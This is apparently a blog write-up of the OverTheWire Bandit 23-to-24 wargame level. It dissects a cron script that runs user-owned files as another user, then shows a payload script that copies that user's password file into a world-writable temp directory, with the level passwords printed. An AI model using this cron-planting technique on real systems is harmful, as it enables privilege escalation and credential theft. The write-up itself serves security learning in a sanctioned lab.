---
date: '2026-09-15'
description: i take it back, screw (cron) j*bs
draft: false
title: bandit-23
weight: 24
---

| info | value                                      |
|:-----|-------------------------------------------:|
| user | `bandit23`                                   |
| pass | `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`         |

> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

> **NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

> **NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

---

## explanation

cron was briefly explained in the [previous](http://dat.vah.wtf/posts/overthewire/bandit/bandit-21/) post

yet again, same story as before

```sh
cat /etc/cron.d/cronjob_bandit24
# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

plus the script

```sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*; do
  if [ "$i" != "." ] && [ "$i" != ".." ]; then
    echo "Handling $i"
    owner="$(stat --format "%U" "./$i")"
    if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
      timeout -s 9 60 "./$i"
    fi
    rm -rf "./$i"
  fi
done
```

dissecting it:
1. enable [nullglob](https://man7.org/linux/man-pages/man7/glob.7.html) (why is this not enabled by default..?)
  - "Globs are basically patterns that can be used to match filenames or other strings" - [wooledge.org/bashguide](https://mywiki.wooledge.org/BashGuide/Patterns#Glob_Patterns-1)
  - [zsh](https://www.zsh.org/) handles this via [`setopt NULL_GLOB`](https://zsh.sourceforge.io/Doc/Release/Options.html#index-NULL_005fGLOB) (distinctive from [`CSH_NULL_GLOB`](https://zsh.sourceforge.io/Doc/Release/Options.html#index-CSH_005fNULL_005fGLOB)), but because the shebang executes bash, this information is completely useless
2. save "bandit23" into the `myname` variable
3. cd into `/var/spool/bandit23/foo`, exit if it doesn't exit
4. run a loop for all (dot) files
5. exclude the current (`"."`) & parent (`..`) dir from the loop
6. _if the condition above is true:_ save the current user name of the file owner (`stat --format "%U"`) into the `owner` variable - with safe guards, to avoid filenames starting with `-` being misparsed as options, f.e. `./-weird-file` instead of `-weird-file` (<- errors)
7. check if owner is bandit23 & the file, (the current iterator "$i" is going over), exists & is a regular file ([-f FILE](https://www.man7.org/linux/man-pages/man1/test.1.html))
8. _if the condition above is true:_ [timeout](https://man7.org/linux/man-pages/man1/timeout.1.html) with a hard kill (`SIGKILL`/`9`) [signal](https://unix.stackexchange.com/questions/317492/list-of-kill-signals) & wait 60 seconds before executing the current file `$i`
9. lastly, remove everything inside the dir; a time based exploit :D

now the next steps are to assemble a script owned by bandit23, but gets executed as bandit24 (handled by the cron job):

> make sure to have a backup of the script before moving it into `/var/spool/bandit24/foo`

```sh
# lets create a temp dir first
cd $(mktemp -d)

# a more elegant way of writing contents directly into a file
cat > payload <<eof
#!/usr/bin/env bash

SRC="/etc/bandit_pass/bandit24"
DST="/tmp/tmp.98u7LMDfzh/pass" # adjust the path!

cat "\$SRC" > "\$DST"
eof

# lastly: the script needs the x bit such that bandit24 can execute it
# & the temp dir also needs more open perms for bandit24 to write into it,
# recall the sticky bit that's on `/tmp`

touch pass # otherwise bandit24 creates `pass` in a bandit23 owned dir
chmod -R 777 . # recursively apply rwx to the dir & all contents inside
cp -a payload /var/spool/bandit24/foo

# if you're impatient, see how long the file lives until `stat`
# reports "os error 2" (file not found); quit with ctrl-c
watch -n 1 stat /var/spool/bandit24/foo/payload

cat pass
# hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```
